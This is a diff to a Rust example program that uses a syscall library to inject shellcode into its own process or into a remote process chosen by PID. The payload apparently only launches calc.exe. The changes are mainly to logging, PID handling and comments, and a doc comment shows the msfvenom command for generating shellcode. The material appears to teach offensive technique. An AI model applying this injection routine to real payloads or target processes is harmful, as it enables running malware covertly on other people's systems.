@@ -1,11 +1,13 @@
 use std::ffi::c_void;
 use std::ptr::null;
 use std::{mem, process};
+use std::fmt::format;
 
 use thermite::models::windows::nt_status::NtStatus;
-use thermite::models::windows::peb_teb::UNICODE_STRING;
+// Only needed for printing the status after each syscalls
+use thermite::models::windows::peb_teb::UNICODE_STRING; //
 
-use thermite::{debug, syscall};
+use thermite::{debug, error, info, syscall};
 
 // Don't forget #[repr(C)] !
 
@@ -45,10 +47,7 @@ const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
 
 /// A basic msfvenom shellcode, just spawns calc.exe
 ///
-/// __Stranger Danger__
-///
-/// Don't put everything you find in your computer, a shellcode is dangerous
-///
+/// Remember, Stranger Danger,
 /// Just go get your own shellcode, you can generate it using the following command:
 /// ```bash
 /// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
@@ -86,10 +85,10 @@ fn print_status(str: &str, x: i32) -> NtStatus {
     let nt_status: NtStatus = unsafe { mem::transmute(x) };
     match nt_status {
         NtStatus::StatusSuccess => {
-            eprintln!("[^-^] {str}: {nt_status}");
+	        info!(format!("{}: {}", str, nt_status))
         }
         _ => {
-            eprintln!("[TwT] {str}: {nt_status}");
+	        error!(nt_status);
             process::exit(nt_status as _);
         }
     }
@@ -111,13 +110,13 @@ fn read_pid() -> Option<u32> {
 
 ///
 /// The function below demonstrate how to execute a shellcode
-/// either locally, in our own processe's memory or by
+/// either locally, in our own processes memory or by
 /// injecting it in a remote process.
 ///
 /// It takes a PID as argument, if the pid is 0, the shellcode will be executed locally
 /// If a PID is provided, it will be injected in the target process
 ///
-fn injector(pid: u32) {
+fn injector(pid: Option<u32>) {
     // Declaring structures we're going to need
     let mut thread_handle: isize = 0;
     let oa_process: ObjectAttributes = ObjectAttributes {
@@ -135,8 +134,8 @@ fn injector(pid: u32) {
 
     // If we have a target PID,
     // we go get a real handle to the target process
-    // Else w'll  just continue with the pseudo handle
-    if pid.ne(&0) {
+	// Else we'll  just continue with the pseudo handle
+	if let Some(pid) = pid {
         let client_id = ClientId {
             unique_process: pid as _,
             unique_thread: 0 as _,
@@ -151,7 +150,6 @@ fn injector(pid: u32) {
         print_status("NtOpenProcess", nt_status);
         debug!(process_handle);
     }
-
     let mut buf_size: usize = POP_CALC.len();
     let mut base_addr: *mut c_void = 0u32 as _;
 
@@ -232,5 +230,5 @@ fn injector(pid: u32) {
 }
 
 fn main() {
-    injector(read_pid().unwrap_or(0));
+	injector(read_pid());
 }
